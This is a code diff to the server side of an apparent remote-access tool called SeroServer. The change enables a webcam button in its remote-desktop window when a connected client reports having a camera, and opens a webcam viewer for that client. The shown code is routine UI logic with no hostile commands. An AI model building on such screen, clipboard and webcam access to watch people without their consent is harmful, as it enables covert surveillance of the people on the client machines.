@@ -6,6 +6,8 @@ using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using SkiaSharp;
+using System.ComponentModel;
+using SeroServer.Data;
 using SeroServer.Net;
 using SeroServer.Protocol;
 
@@ -90,11 +92,21 @@ public partial class RemoteDesktopWindow : Window
             _server.UnregisterHandler(clientId, PacketType.RdpFrame);
             _server.UnregisterHandler(clientId, PacketType.RdpClipboard);
             _server.ClientDisconnected -= OnClientDisconnected;
+            if (_server.ConnectedClients.TryGetValue(clientId, out var client))
+            {
+                client.PropertyChanged -= OnClientPropertyChanged;
+            }
             if (_streaming) SendStop();
         };
 
         TxtClientId.Text = $"[ {clientId} ]";
         TxtStatus.Text = "Connecting...";
+
+        if (_server.ConnectedClients.TryGetValue(_clientId, out var client))
+        {
+            client.PropertyChanged += OnClientPropertyChanged;
+            UpdateWebcamButtonState(client);
+        }
 
         // Fade-in animation on open
         Opacity = 0;
@@ -600,5 +612,39 @@ public partial class RemoteDesktopWindow : Window
     {
         Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
         Height = Math.Max(MinHeight, Height + e.VerticalChange);
+    }
+
+    private void OnClientPropertyChanged(object? sender, PropertyChangedEventArgs e)
+    {
+        if (e.PropertyName == nameof(ConnectedClient.CameraStatus))
+        {
+            if (sender is ConnectedClient client)
+            {
+                Dispatcher.BeginInvoke(() => UpdateWebcamButtonState(client));
+            }
+        }
+    }
+
+    private void UpdateWebcamButtonState(ConnectedClient client)
+    {
+        bool hasCam = client.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase);
+        BtnWebcam.IsEnabled = hasCam;
+        BtnWebcam.Opacity = hasCam ? 1.0 : 0.35;
+    }
+
+    private void BtnWebcam_Click(object sender, RoutedEventArgs e)
+    {
+        var mainWin = Application.Current.MainWindow as ServerWindow;
+        if (mainWin == null) return;
+
+        mainWin.OpenFeatureWindow<WebcamWindow>(_clientId, () =>
+        {
+            var area = SystemParameters.WorkArea;
+            const int margin = 60;
+            var w = new WebcamWindow(_server, _clientId);
+            w.Left = area.Left + margin;
+            w.Top  = area.Top  + margin;
+            return w;
+        });
     }
 }
